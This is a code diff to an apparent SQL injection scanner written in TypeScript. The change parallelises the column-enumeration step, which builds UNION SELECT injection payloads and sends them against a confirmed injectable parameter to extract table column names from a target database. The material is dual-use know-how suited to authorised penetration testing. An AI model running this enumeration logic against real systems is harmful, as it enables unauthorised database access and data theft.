@@ -1319,23 +1319,22 @@ export class SqlScanOrchestrator {
       };
       if (this.onCatalog) this.onCatalog(this.catalog);
 
-      // â”€â”€â”€ Step 8: Adaptive Column Enumeration â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+      // ─── Step 8: Adaptive Column Enumeration ───────────────────────
       const tablesToEnumerate = appTables.slice(0, 8);
-      for (let idx = 0; idx < tablesToEnumerate.length; idx++) {
-        const t = tablesToEnumerate[idx];
-        if (this.isAborted) break;
+      const enumerateTableColumns = async (t: DiscoveredTable, idx: number) => {
+        if (this.isAborted) return;
         this.updateProgress('column_enumeration', `Enumerating columns: ${t.name}`, 88 + Math.round((idx / (tablesToEnumerate.length || 1)) * 6));
 
         if (confirmedColumnCount > 0) {
           // UNION-based column extraction
-          const colQuery = MetadataExtractor.getColumnEnumerationQuery(confirmedInjectableParam, confirmedRenderColumn, confirmedColumnCount, t.name, this.dbmsFingerprint.dbms);
+          const colQuery = MetadataExtractor.getColumnEnumerationQuery(confirmedInjectableParam!, confirmedRenderColumn, confirmedColumnCount, t.name, this.dbmsFingerprint.dbms);
           if (colQuery) {
-            const colRes = await this.executeProbe(parsed, confirmedInjectableParam, colQuery, true);
+            const colRes = await this.executeProbe(parsed, confirmedInjectableParam!, colQuery, true);
             let colTokens = MetadataExtractor.extractDelimitedTokens(colRes.body, 'COL');
             let cols = MetadataExtractor.parseColumnTokens(colTokens);
             if (cols.length === 0) {
-              const cleanColQuery = MetadataExtractor.getCleanColumnEnumerationQuery(confirmedInjectableParam, confirmedRenderColumn, confirmedColumnCount, t.name, this.dbmsFingerprint.dbms);
-              const cColRes = await this.executeProbe(parsed, confirmedInjectableParam, cleanColQuery, true);
+              const cleanColQuery = MetadataExtractor.getCleanColumnEnumerationQuery(confirmedInjectableParam!, confirmedRenderColumn, confirmedColumnCount, t.name, this.dbmsFingerprint.dbms);
+              const cColRes = await this.executeProbe(parsed, confirmedInjectableParam!, cleanColQuery, true);
               const rawCols = MetadataExtractor.extractHtmlOrTextTokens(cColRes.body, baselineBody);
               cols = rawCols.map((cName) => ({
                 name: cName, dataType: 'VARCHAR', isNullable: true,
@@ -1348,7 +1347,7 @@ export class SqlScanOrchestrator {
 
             // Bruteforce column extraction if above failed
             if (cols.length === 0 && !this.isAborted) {
-              const isNum = /^\d+$/.test(confirmedInjectableParam.originalValue.trim());
+              const isNum = /^\d+$/.test(confirmedInjectableParam!.originalValue.trim());
               const cPrefix = isNum ? ' UNION SELECT ' : "' UNION SELECT ";
 
               // Build column extraction queries for all DBMS types
@@ -1378,7 +1377,7 @@ export class SqlScanOrchestrator {
                 const cParts = Array(confirmedColumnCount).fill('NULL');
                 cParts[confirmedRenderColumn - 1] = cq.colExpr;
                 const bruteColPayload = `${cPrefix}${cParts.join(',')} ${cq.from}`;
-                const bcRes = await this.executeProbe(parsed, confirmedInjectableParam, bruteColPayload, true);
+                const bcRes = await this.executeProbe(parsed, confirmedInjectableParam!, bruteColPayload, true);
                 if (bcRes.status === 200 || bcRes.status === baselineStatus) {
                   const rawCols = MetadataExtractor.extractHtmlOrTextTokens(bcRes.body, baselineBody);
                   if (rawCols.length > 0) {
@@ -1730,6 +1729,15 @@ export class SqlScanOrchestrator {
         // Emit live incremental catalog update after each table
         if (this.onCatalog) {
           this.onCatalog({ ...this.catalog, applicationTables: [...appTables], systemTables: [...sysTables] });
+        }
+      };
+
+      if (this.concurrentExecutor.getConcurrency() > 1 && tablesToEnumerate.length > 1) {
+        this.log('info', 'column_enumeration', `Executing bounded parallel column enumeration across ${tablesToEnumerate.length} tables (concurrency: ${this.concurrentExecutor.getConcurrency()})...`);
+        await this.concurrentExecutor.mapParallel(tablesToEnumerate, enumerateTableColumns);
+      } else {
+        for (let idx = 0; idx < tablesToEnumerate.length; idx++) {
+          await enumerateTableColumns(tablesToEnumerate[idx], idx);
         }
       }
 
